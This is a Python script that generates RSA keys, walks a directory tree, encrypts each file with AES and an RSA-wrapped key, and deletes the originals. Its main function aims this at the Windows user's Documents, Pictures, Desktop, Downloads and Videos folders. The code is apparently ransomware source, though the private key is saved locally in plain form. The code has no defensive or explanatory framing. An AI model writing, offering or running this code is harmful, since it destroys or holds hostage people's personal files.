from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding as sym_padding
from os import path, listdir
import os


def generate_keys():
    # Generate RSA keys
    private_key = rsa.generate_private_key(
        public_exponent=65537, key_size=2048, backend=default_backend())
    public_key = private_key.public_key()

    # Serialize private key
    pem = private_key.private_bytes(encoding=serialization.Encoding.PEM,
                                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                                    encryption_algorithm=serialization.NoEncryption())

    # Write private key to file
    with open("keys/private_key.pem", "wb") as priv_file:
        priv_file.write(pem)

    # Serialize public key
    pem = public_key.public_bytes(encoding=serialization.Encoding.PEM,
                                  format=serialization.PublicFormat.SubjectPublicKeyInfo)

    # Write public key to file
    with open("keys/public_key.pem", "wb") as pub_file:
        pub_file.write(pem)


def encrypt_file(file_path, public_key):
    # Generate a new AES key and IV
    aes_key = os.urandom(32)
    iv = os.urandom(16)

    # Read file contents
    with open(file_path, 'rb') as file:
        file_data = file.read()

    # Pad the data
    padder = sym_padding.PKCS7(128).padder()
    padded_data = padder.update(file_data) + padder.finalize()

    # Encrypt the data with AES
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv),
                    backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Encrypt the AES key with RSA public key
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        rsa_padding.OAEP(
            mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Remove the original file safely after encryption
    try:
        os.remove(file_path)
        print(f"Original file {file_path} removed after encryption.")
    except OSError as e:
        print(f"Error: {file_path} : {e.strerror}")

    # Save encrypted file contents and AES key
    with open(file_path + '.enc', 'wb') as encrypted_file:
        encrypted_file.write(iv + encrypted_aes_key + encrypted_data)


def encrypt_directory(directory_path, public_key_pem_path):
    # Load public key
    with open(public_key_pem_path, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(), backend=default_backend())

    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = path.join(root, file)
            encrypt_file(file_path, public_key)
            print(f"Encrypted {file_path}")


def main():
    # Example usage
    generate_keys()  # Run once to generate keys

    # Directories to target
    user_dirs = [
        os.path.join(os.environ['USERPROFILE'], 'Documents'),
        os.path.join(os.environ['USERPROFILE'], 'Pictures'),
        os.path.join(os.environ['USERPROFILE'], 'Desktop'),
        os.path.join(os.environ['USERPROFILE'], 'Downloads'),
        os.path.join(os.environ['USERPROFILE'], 'Videos')
    ]

    for directory in user_dirs:
        if os.path.exists(directory):
            encrypt_directory(directory, "keys/public_key.pem")
        else:
            print(f"Directory does not exist: {directory}")
